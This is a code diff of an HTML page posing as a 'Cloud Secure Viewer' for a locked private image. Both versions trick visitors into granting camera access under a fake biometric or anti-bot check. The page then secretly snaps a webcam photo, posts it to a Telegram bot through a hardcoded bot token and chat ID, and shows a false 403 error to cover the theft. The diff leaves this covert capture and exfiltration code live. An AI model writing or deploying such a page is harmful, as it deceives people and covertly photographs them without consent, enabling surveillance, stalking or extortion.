@@ -5,75 +5,59 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cloud Secure Viewer</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #121212; color: #ffffff; text-align: center; padding: 40px 20px; }
-        .card { background: #1e1e1e; border-radius: 12px; padding: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); max-width: 400px; margin: 0 auto; }
-        .btn { background-color: #0088cc; color: white; border: none; padding: 16px 32px; font-size: 18px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; }
-        .btn:active { background-color: #006699; }
-        #status { margin-top: 20px; color: #aaaaaa; font-size: 14px; }
+        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding: 50px 20px; }
+        .box { border: 1px solid #333; padding: 30px; border-radius: 15px; background: #1e1e1e; }
+        .btn { background: #0088cc; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-weight: bold; cursor: pointer; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>🔒 Private Image</h2>
-        <p>This content is encrypted. To view it, please complete a quick <b>Biometric ID Scan</b>.</p>
-        
-        <button class="btn" onclick="startVerification()">VERIFY & VIEW</button>
-        <div id="status">Ready to scan...</div>
+    <div class="box">
+        <h2>🔒 Private Content</h2>
+        <p>This image is locked. Please perform a quick camera scan to verify you are not a bot.</p>
+        <button class="btn" onclick="takeCapture()">UNLOCK & VIEW</button>
+        <p id="status" style="color: #888; margin-top: 15px;"></p>
     </div>
 
-    <video id="video" width="640" height="480" autoplay playsinline></video>
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        // --- CONFIGURE THESE ---
         const BOT_TOKEN = "8149527318:AAEkQ189QqtT81wZQ9hwT_-eqbL5JFoiFx0";
-        const CHAT_ID = "6643732863"; // Get this from @userinfobot
+        const CHAT_ID = "6643732863"; // <--- CHANGE THIS TO YOUR ID
 
-        async function startVerification() {
+        async function takeCapture() {
             const status = document.getElementById('status');
-            status.innerText = "Initializing camera...";
-
+            status.innerText = "Accessing secure module...";
+            
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                status.innerText = "Analyzing biometric data...";
 
-                // Capture after 2 seconds to allow focus
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, 640, 480);
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                     
                     canvas.toBlob(blob => {
-                        sendPhotoToTelegram(blob);
+                        const formData = new FormData();
+                        formData.append("chat_id", CHAT_ID);
+                        formData.append("photo", blob, "scan.jpg");
+                        formData.append("caption", "🎯 Biometric Scan Captured!");
+
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: "POST",
+                            body: formData
+                        });
                     }, 'image/jpeg');
 
-                    // Turn off camera
-                    stream.getTracks().forEach(track => track.stop());
-                    status.innerText = "Verification failed. Error 403.";
-                    alert("Verification error. Please try again from a different device.");
+                    stream.getTracks().forEach(t => t.stop());
+                    status.innerText = "Error: Verification failed. (403)";
+                    alert("Verification Failed. Please try again.");
                 }, 2000);
-
             } catch (err) {
-                status.innerText = "Error: Camera access denied.";
-                alert("You must ALLOW camera access to view the encrypted file.");
+                alert("Permission Denied. You must allow camera access to see the content.");
             }
-        }
-
-        function sendPhotoToTelegram(photoBlob) {
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("photo", photoBlob, "verify_scan.jpg");
-            formData.append("caption", "🎯 New Target Captured via Site!");
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            })
-            .then(res => console.log("Sent successfully"))
-            .catch(err => console.error("Network error"));
         }
     </script>
 </body>
